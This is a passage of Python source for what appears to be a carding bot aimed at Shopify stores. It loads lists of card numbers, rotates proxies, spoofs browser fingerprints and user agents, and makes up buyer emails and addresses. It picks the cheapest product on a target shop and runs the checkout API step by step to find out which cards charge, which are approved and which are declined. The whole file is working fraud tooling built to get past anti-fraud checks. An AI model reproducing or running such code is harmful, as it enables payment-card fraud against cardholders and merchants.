                queue_token, email, currency, country)
            queue_token2 = extract_queue_token(proposal2_body)
            if not queue_token2:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.error = Exception(f"Step 5 failed: {e}")
            return result

        addr              = address_for_country(country if country != "US" else "US")
        tried_countries   = [addr.country_code]
        fallback_addrs    = get_fallback_addresses(addr.country_code)
        fallback_idx      = 0
        final_proposal_body = None
        final_queue_token   = None

        try:
            for attempt in range(1 + len(fallback_addrs)):
                _, p3_body = send_proposal3(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, price, proposal_id, build_id, source_token,
                    queue_token2, email, addr, currency, country)

                q3 = extract_queue_token(p3_body)
                if not q3:
                    raise Exception("could not extract queueToken from proposal3")

                is_digital = not extract_is_shipping_required(p3_body)

                if is_digital:
                    final_proposal_body = p3_body
                    final_queue_token   = q3
                    break

                if detect_shipping_restriction(p3_body) and fallback_idx < len(fallback_addrs):
                    addr          = fallback_addrs[fallback_idx]
                    fallback_idx += 1
                    queue_token2  = q3
                    continue

                signed_check = extract_signed_handles(p3_body)
                if not signed_check:
                    _, p3_body2 = send_proposal3(
                        client, shop_url, checkout_url, checkout_token, session_token,
                        stable_id, variant_id, price, proposal_id, build_id, source_token,
                        q3, email, addr, currency, country)
                    q3      = extract_queue_token(p3_body2) or q3
                    p3_body = p3_body2

                final_proposal_body = p3_body
                final_queue_token   = q3
                break

            if not final_proposal_body:
                raise Exception(f"No shipping available after trying: {tried_countries + [a.country_code for a in fallback_addrs[:fallback_idx]]}")

        except Exception as e:
            result.retryable = True
            result.error = Exception(f"Step 6 failed: {e}")
            return result

        try:
            gateways = extract_payment_gateways(final_proposal_body)
            if gateways:
                for gw in gateways:
                    if gw.get("typename") == "PaymentProvider":
                        result.gateway = gw.get("display") or gw.get("name") or ""
                        break
                if not result.gateway:
                    result.gateway = gateways[0].get("display") or gateways[0].get("name") or ""
        except Exception:
            pass

        try:
            ident_sig = extract_identification_signature(checkout_html)
            if not ident_sig:
                raise Exception("could not extract identification signature")
            pci_status, pci_body = send_pci_session(
                ident_sig, card_number, f"{addr.first_name} {addr.last_name}",
                card_month, card_year, card_cvv, site_name, proxy_url)
            pci_session_id = extract_pci_session_id(pci_body)
            if not pci_session_id:
                raise Exception("could not extract session ID")
        except Exception as e:
            result.error = Exception(f"Step 9 failed: {e}")
            return result

        try:
            is_digital = not extract_is_shipping_required(final_proposal_body)

            saved_delivery_handle = extract_delivery_handle(final_proposal_body)
            
            delivery_handle = saved_delivery_handle
            if not delivery_handle and not is_digital:
                result.retryable = True
                raise Exception("could not extract delivery handle")

            signed_handles = extract_signed_handles(final_proposal_body)
            if len(signed_handles) == 0 and not is_digital:
                result.retryable = True
                raise Exception("could not extract signedHandles")

            shipping_amount = extract_shipping_amount(final_proposal_body)
            if not shipping_amount and not is_digital:
                result.retryable = True
                raise Exception("could not extract shipping amount")
            if not shipping_amount:
                shipping_amount = "0.00"

            total_amount = (extract_checkout_total(final_proposal_body)
                            or extract_seller_total(final_proposal_body)
                            or (extract_running_total(final_proposal_body) if is_digital else ""))
            if not total_amount:
                raise Exception("could not extract total amount")
            result.amount = total_amount

            attempt_token = generate_attempt_token(checkout_token)
            current_tax   = extract_tax_amount(final_proposal_body)
            current_total = total_amount

            MAX_TAX_RETRIES = 3
            for tax_attempt in range(1, MAX_TAX_RETRIES + 1):
                submit_status, submit_body = send_submit_for_completion(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, price, submit_id, build_id, source_token,
                    final_queue_token, email, addr, delivery_handle, shipping_amount, current_total,
                    pci_session_id, attempt_token, currency, country, signed_handles,
                    is_digital=is_digital,
                    tax_amount=current_tax
                )

                if "TAX_NEW_TAX_MUST_BE_ACCEPTED" in submit_body:
                    new_tax   = extract_tax_from_rejected(submit_body)
                    new_total = extract_total_from_rejected(submit_body)
                    if new_tax:
                        current_tax = new_tax
                    if new_total:
                        current_total = new_total
                    if tax_attempt == MAX_TAX_RETRIES:
                        raise Exception("tax kept changing after 3 retries")
                    continue

                break

            check_submit_errors(submit_status, submit_body)

            receipt_id = extract_receipt_id(submit_body)
            if not receipt_id:
                error_msg = extract_any_error(submit_body)
                if "CAPTCHA" in (error_msg or ""):
                    error_msg = "CARD_DECLINED"
                if error_msg:
                    result.status      = CheckStatus.DECLINED
                    result.status_code = error_msg
                    result.error       = Exception(error_msg)
                    result.retryable   = any(k in error_msg.lower() for k in ['inventory','retry','try again','generic'])
                else:
                    result.retryable = True
                    result.error = Exception("could not extract receiptId or error message")
                return result

            receipt_session_token = extract_receipt_session_token(submit_body)
            if not receipt_session_token:
                raise Exception("could not extract sessionToken")

            poll_delay_re = re.compile(r'"pollDelay"\s*:\s*(\d+)')
            type_name_re = re.compile(r'"__typename"\s*:\s*"(ProcessingReceipt|FailedReceipt|SuccessfulReceipt|ProcessedReceipt|ActionRequiredReceipt)"')

            for poll_num in range(1, 31):
                _, poll_body = send_poll_for_receipt(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    build_id, source_token, poll_for_receipt_id, receipt_id, receipt_session_token
                )

                receipt_type = ""
                match = type_name_re.search(poll_body)
                if match:
                    receipt_type = match.group(1)

                status_code = extract_receipt_status_code(poll_body, receipt_type)
                result.status_code = status_code

                if receipt_type in ["SuccessfulReceipt", "ProcessedReceipt"]:
                    result.status      = CheckStatus.CHARGED
                    result.status_code = "ORDER_PLACED"
                    receipt_link       = extract_receipt_url(poll_body, shop_url)
                    result.receipt_url = receipt_link or shop_url
                    result.paid_site   = shop_url
                    return result

                if receipt_type == "ActionRequiredReceipt":
                    result.status = CheckStatus.APPROVED
                    result.status_code = "3DS_AUTHENTICATION"
                    return result

                if receipt_type == "FailedReceipt":
                    error_code = ""
                    error_re = re.compile(r'"code"\s*:\s*"([^"]+)"')
                    match = error_re.search(poll_body)
                    if match:
                        error_code = match.group(1)
                    if "CAPTCHA" in error_code:
                        error_code = "CARD_DECLINED"

                    if error_code == "INSUFFICIENT_FUNDS":
                        result.status = CheckStatus.APPROVED
                        result.status_code = "INSUFFICIENT_FUNDS"
                        return result
                    elif error_code == "CARD_DECLINED":
                        result.status = CheckStatus.DECLINED
                        result.error = Exception(f"{error_code}")
                        return result
                    elif error_code == "GENERIC_ERROR":
                        result.status = CheckStatus.DECLINED
                        result.status_code = "CARD_DECLINED"
                        result.error = Exception("CARD_DECLINED")
                        return result
                    else:
                        if "InventoryReservationFailure" in poll_body:
                            result.status = CheckStatus.ERROR
                            result.retryable = True
                            return result
                        result.status = CheckStatus.DECLINED
                        result.error = Exception(f"{error_code}")
                        return result

                delay = 500
                match = poll_delay_re.search(poll_body)
                if match:
                    try:
                        d = int(match.group(1))
                        if d > 0:
                            delay = d
                    except ValueError:
                        pass
                time.sleep(min(delay, 300) / 1000.0)

            # ✅ خلصت المحاولات ولسه ProcessingReceipt → صنّفه كـ ERROR (retry)
            result.status      = CheckStatus.ERROR
            result.status_code = "PROCESSING"
            result.error       = Exception("PROCESSING")
            result.retryable   = True
            return result

        except Exception as e:
            result.error = e
            return result

    except Exception as e:
        result.error = e

    return result


def load_card_entries(file_path: str) -> List[str]:
    with open(file_path, 'r') as f:
        card_data = f.read()
    raw_lines = card_data.replace('\r\n', '\n').split('\n')
    entries = []
    for raw_line in raw_lines:
        line = raw_line.strip()
        if line:
            entries.append(line)
    if len(entries) == 0:
        raise Exception(f"no card entries found in {file_path}")
    return entries


def parse_card_entry(card_entry: str) -> Tuple[str, int, int, str]:
    card_parts = card_entry.strip().split('|')
    if len(card_parts) != 4:
        raise Exception(f"invalid card format in file: {card_entry}")
    try:
        card_month = int(card_parts[1])
        card_year = int(card_parts[2])
    except ValueError as e:
        raise Exception(f"invalid card month/year in file: {e}")
    return card_parts[0], card_month, card_year, card_parts[3]


def load_proxy_entries(file_path: str) -> List[str]:
    with open(file_path, 'r') as f:
        data = f.read()
    lines = data.split('\n')
    entries = []
    for line in lines:
        line = line.strip()
        if line and not line.startswith('#'):
            entries.append(line)
    if len(entries) == 0:
        raise Exception(f"no proxy entries found in {file_path}")
    return entries


def normalize_proxy(raw: str) -> str:
    p = raw.strip()
    if not p:
        raise Exception("empty proxy")
    if '://' not in p:
        parts = p.split(':')
        if len(parts) == 4:
            p = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        else:
            p = "http://" + p
    parsed = urllib.parse.urlparse(p)
    if not parsed.netloc:
        raise Exception(f"invalid proxy format: {raw}")
    return p


def test_proxy(proxy_url: str) -> bool:
    try:
        session = requests.Session()
        session.proxies = {'http': proxy_url, 'https': proxy_url}
        resp = session.get("https://api.ipify.org?format=json", timeout=10)
        if resp.status_code == 200 and resp.text.strip():
            return True
    except Exception:
        pass
    return False


def find_working_proxies(proxies: List[str]) -> List[str]:
    working = []
    seen = set()
    for i, raw in enumerate(proxies):
        try:
            proxy_url = normalize_proxy(raw)
        except Exception:
            continue
        if proxy_url in seen:
            continue
        if test_proxy(proxy_url):
            seen.add(proxy_url)
            working.append(proxy_url)
    if len(working) == 0:
        raise Exception("no working proxy found")
    return working


def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -> CheckResult:
    currency = "USD"
    country = "US"
    site_name = shop_url.replace("https://", "").replace("http://", "")

    result = CheckResult(
        card=card_entry,
        shop_url=shop_url,
        site_name=site_name,
        currency=currency,
        status=CheckStatus.ERROR
    )

    try:
        card_number, card_month, card_year, card_cvv = parse_card_entry(card_entry)
    except Exception as e:
        result.error = e
        return result

    email = generate_random_email()
    impersonate = random.choice(BROWSER_PROFILES)
    user_agent = random.choice(USER_AGENTS)

    client = TLSClient(timeout=12, proxy_url=proxy_url,
                       impersonate=impersonate, user_agent=user_agent)

    try:
        try:
            title, product_id, variant_id, price = find_cheapest_product(
                client, shop_url, MIN_PRODUCT_PRICE, MAX_PRODUCT_PRICE
            )
            _ = title, product_id
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 0 failed: {e}")
            return result

        try:
            checkout_url, checkout_token, session_token, checkout_html = add_to_cart_and_checkout(client, shop_url, variant_id)
            stable_id = extract_stable_id(checkout_html)
            build_id = extract_commit_sha(checkout_html)
            source_token = extract_source_token(checkout_html)
            if not stable_id or not build_id or not source_token:
                raise Exception("missing stableId, buildId, or sourceToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 1 failed: {e}")
            return result

        try:
            pat_id = extract_private_access_token_id(checkout_html)
            if not pat_id:
                raise Exception("could not extract private_access_token id")
            fetch_private_access_token(client, shop_url, checkout_url, pat_id)
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 2 failed: {e}")
            return result

        try:
            actions_url = extract_actions_js_url(checkout_html, shop_url)
            if not actions_url:
                raise Exception("could not find actions JS URL")
            js_body = fetch_actions_js(client, actions_url, shop_url)
            proposal_id = extract_proposal_id(js_body)
            submit_id = extract_submit_for_completion_id(js_body)
            if not proposal_id or not submit_id:
                raise Exception("missing Proposal or Submit ID")
            poll_for_receipt_id = "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 3 failed: {e}")
            return result

        try:
            _, proposal_body = send_proposal(client, shop_url, checkout_url, checkout_token, session_token,
                                              stable_id, variant_id, price, proposal_id, build_id, source_token,
                                              currency, country)
            cur = extract_seller_currency(proposal_body)
            if cur and cur != currency:
                currency = cur
            ctr = extract_seller_country(proposal_body)
            if ctr and ctr != country:
                country = ctr
            result.currency = currency
            if currency == "USD":
                seller_price = extract_seller_merchandise_price(proposal_body)
                if seller_price and seller_price != price:
                    price = seller_price
            queue_token = extract_queue_token(proposal_body)
            if not queue_token:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 4 failed: {e}")
            return result

        try:
            _, proposal2_body = send_proposal2(client, shop_url, checkout_url, checkout_token, session_token,
                                                stable_id, variant_id, price, proposal_id, build_id, source_token,
                                                queue_token, email, currency, country)
            queue_token2 = extract_queue_token(proposal2_body)
            if not queue_token2:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 5 failed: {e}")
            return result

        try:
            addr = address_for_country(country)
            _, proposal3_body = send_proposal3(client, shop_url, checkout_url, checkout_token, session_token,
                                                stable_id, variant_id, price, proposal_id, build_id, source_token,
                                                queue_token2, email, addr, currency, country)
            queue_token3 = extract_queue_token(proposal3_body)
            if not queue_token3:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 6 failed: {e}")
            return result

        try:
            _, proposal4_body = send_proposal3(client, shop_url, checkout_url, checkout_token, session_token,
                                                stable_id, variant_id, price, proposal_id, build_id, source_token,
                                                queue_token3, email, addr, currency, country)
            queue_token4 = extract_queue_token(proposal4_body)
            if not queue_token4:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 7 failed: {e}")
            return result

        try:
            proposal5_status, proposal5_body = send_proposal3(client, shop_url, checkout_url, checkout_token, session_token,
                                                               stable_id, variant_id, price, proposal_id, build_id, source_token,
                                                               queue_token4, email, addr, currency, country)
            _ = proposal5_status
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 8 failed: {e}")
            return result

        try:
            gateways = extract_payment_gateways(proposal5_body)
            if gateways:
                for gw in gateways:
                    if gw.get("typename") == "PaymentProvider":
                        result.gateway = gw.get("display") or gw.get("name") or ""
                        break
                if not result.gateway:
                    result.gateway = gateways[0].get("display") or gateways[0].get("name") or ""
        except Exception:
            pass

        try:
            ident_sig = extract_identification_signature(checkout_html)
            if not ident_sig:
                raise Exception("could not extract identification signature")
            pci_status, pci_body = send_pci_session(ident_sig, card_number, f"{addr.first_name} {addr.last_name}",
                                                     card_month, card_year, card_cvv, site_name, proxy_url)
            _ = pci_status
            pci_session_id = extract_pci_session_id(pci_body)
            if not pci_session_id:
                raise Exception("could not extract session ID")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 9 failed: {e}")
            return result

        try:
            queue_token5 = extract_queue_token(proposal5_body)
            if not queue_token5:
                raise Exception("could not extract queueToken")

            is_digital = not extract_is_shipping_required(proposal5_body)

            delivery_handle = extract_delivery_handle(proposal5_body)
            if not delivery_handle and not is_digital:
                result.retryable = True
                raise Exception("Step 10 failed: could not extract delivery handle")

            signed_handles = extract_signed_handles(proposal5_body)
            if len(signed_handles) == 0 and not is_digital:
                result.retryable = True
                raise Exception("Step 10 failed: could not extract signedHandles")

            shipping_amount = extract_shipping_amount(proposal5_body)
            if not shipping_amount and not is_digital:
                result.retryable = True
                raise Exception("Step 10 failed: could not extract shipping amount")
            if not shipping_amount:
                shipping_amount = "0.00"

            total_amount = extract_checkout_total(proposal5_body)
            if not total_amount:
                total_amount = extract_seller_total(proposal5_body)
            if not total_amount and is_digital:
                total_amount = extract_running_total(proposal5_body)
            if not total_amount:
                raise Exception("Step 10 failed: could not extract total amount")
            result.amount = total_amount

            attempt_token = generate_attempt_token(checkout_token)
            current_tax    = extract_tax_amount(proposal5_body)
            current_total  = total_amount

            MAX_TAX_RETRIES = 3
            for tax_attempt in range(1, MAX_TAX_RETRIES + 1):
                submit_status, submit_body = send_submit_for_completion(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, price, submit_id, build_id, source_token, queue_token5, email,
                    addr, delivery_handle, shipping_amount, current_total,
                    pci_session_id, attempt_token, currency, country, signed_handles,
                    is_digital=is_digital,
                    tax_amount=current_tax
                )
                if "TAX_NEW_TAX_MUST_BE_ACCEPTED" in submit_body:
                    new_tax   = extract_tax_from_rejected(submit_body)
                    new_total = extract_total_from_rejected(submit_body)
                    if new_tax:
                        current_tax = new_tax
                    if new_total:
                        current_total = new_total
                    continue
                break
            _ = submit_status
            check_submit_errors(submit_status, submit_body)

            receipt_id = extract_receipt_id(submit_body)
            if not receipt_id:
                error_msg = extract_any_error(submit_body)
                if "CAPTCHA" in (error_msg or ""):
                    error_msg = "CARD_DECLINED"
                if error_msg:
                    result.status = CheckStatus.DECLINED
                    result.status_code = error_msg
                    result.error = Exception(error_msg)
                    result.retryable = any(keyword in error_msg.lower() for keyword in ['inventory', 'retry', 'try again', 'generic'])
                else:
                    result.status = CheckStatus.ERROR
                    result.error = Exception("Step 10 failed: could not extract receiptId or error message")
                    result.retryable = True
                return result

            receipt_session_token = extract_receipt_session_token(submit_body)
            if not receipt_session_token:
                raise Exception("Step 10 failed: could not extract sessionToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = e
            return result

        poll_delay_re = re.compile(r'"pollDelay"\s*:\s*(\d+)')
        type_name_re = re.compile(r'"__typename"\s*:\s*"(ProcessingReceipt|FailedReceipt|SuccessfulReceipt|ProcessedReceipt|ActionRequiredReceipt)"')

        for poll_num in range(1, 31):
            try:
                _, poll_body = send_poll_for_receipt(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    build_id, source_token, poll_for_receipt_id, receipt_id, receipt_session_token
                )
                receipt_type = ""
                match = type_name_re.search(poll_body)
                if match:
                    receipt_type = match.group(1)
                status_code = extract_receipt_status_code(poll_body, receipt_type)
                result.status_code = status_code

                if receipt_type in ["SuccessfulReceipt", "ProcessedReceipt"]:
                    result.status      = CheckStatus.CHARGED
                    result.status_code = "ORDER_PLACED"
                    receipt_link       = extract_receipt_url(poll_body, shop_url)
                    result.receipt_url = receipt_link or shop_url
                    result.paid_site   = shop_url
                    return result

                if receipt_type == "ActionRequiredReceipt":
                    result.status = CheckStatus.APPROVED
                    result.status_code = "3DS_AUTHENTICATION"
                    return result

                if receipt_type == "FailedReceipt":
                    error_code = ""
                    error_re = re.compile(r'"code"\s*:\s*"([^"]+)"')
                    match = error_re.search(poll_body)
                    if match:
                        error_code = match.group(1)
                    if "CAPTCHA" in error_code:
                        error_code = "CARD_DECLINED"
                    if error_code == "INSUFFICIENT_FUNDS":
                        result.status = CheckStatus.APPROVED
                        result.status_code = "INSUFFICIENT_FUNDS"
                        return result
                    elif error_code == "CARD_DECLINED":
                        result.status = CheckStatus.DECLINED
                        result.error = Exception(f"{error_code}")
                        return result
                    elif error_code == "GENERIC_ERROR":
                        result.status = CheckStatus.DECLINED
                        result.status_code = "CARD_DECLINED"
                        result.error = Exception("CARD_DECLINED")
                        return result
                    else:
                        if "InventoryReservationFailure" in poll_body:
                            result.status = CheckStatus.ERROR
                            result.retryable = True
                            return result
                        result.status = CheckStatus.DECLINED
                        result.error = Exception(f"{error_code}")
                        return result

                delay = 500
                match = poll_delay_re.search(poll_body)
                if match:
                    try:
                        d = int(match.group(1))
                        if d > 0:
                            delay = d
                    except ValueError:
                        pass
                time.sleep(min(delay, 300) / 1000.0)

            except Exception as e:
                result.status = CheckStatus.ERROR
                result.error = Exception(f"poll {poll_num} failed: {e}")
                return result

        # ✅ خلصت المحاولات ولسه ProcessingReceipt → ERROR (retry)
        result.status      = CheckStatus.ERROR
        result.status_code = "PROCESSING"
        result.error       = Exception("PROCESSING")
        result.retryable   = True
        return result

    finally:
        client.close()


# ──────────────────────── Site loader ─────────────────────

def load_sites_from_file(path: Path) -> List[str]:
    with open(path, "r", encoding="utf-8") as f:
        lines = f.read().splitlines()
    sites = []
    for raw in lines:
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        if not line.startswith(("http://", "https://")):
            line = "https://" + line
        sites.append(line.rstrip("/"))
    if not sites:
        raise Exception("site.txt is empty — add at least one Shopify URL")
    return sites


async def main(card_entry: str, user_id: int):
    from GATES.AUTOSHOPIFY.AUTOSH.shopify_db import shopify_db
    try:
        sites = load_sites_from_file(SITE_TXT)
    except FileNotFoundError:
        return False, "No site.txt found", "0", "None"
    except Exception as e:
        return False, str(e), "0", "None"

    proxies_raw = await shopify_db.get_proxies(user_id)
    if not proxies_raw:
        return False, "no proxies", "0", "None"

    proxy_entry = random.choice(proxies_raw)["proxy"]
    try:
        proxy_url = normalize_proxy(proxy_entry)
    except Exception:
        proxy_url = ""

    proxy_hash = hashlib.md5(proxy_url.encode()).hexdigest()[:8] if proxy_url else "None"
    shop_url = random.choice(sites)
    result: CheckResult = await asyncio.to_thread(
        run_checkout_for_card, shop_url, card_entry, proxy_url
    )

    if result.status == CheckStatus.CHARGED:
        _log.info("%s|ORDER_PLACED", card_entry)
        return True, "ORDER_PLACED", result.amount or "0", proxy_hash, result.receipt_url

    if result.status == CheckStatus.APPROVED:
        _log.info("%s|%s", card_entry, result.status_code or "APPROVED")
        return True, result.status_code or "APPROVED", result.amount or "0", proxy_hash, ""

    if result.status == CheckStatus.DECLINED:
        _log.info("%s|%s", card_entry, str(result.error or result.status_code or "DECLINED"))
        return False, str(result.error or result.status_code or "DECLINED"), "0", proxy_hash, ""

    return False, str(result.error or result.status_code or "Unknown error"), "0", proxy_hash, ""
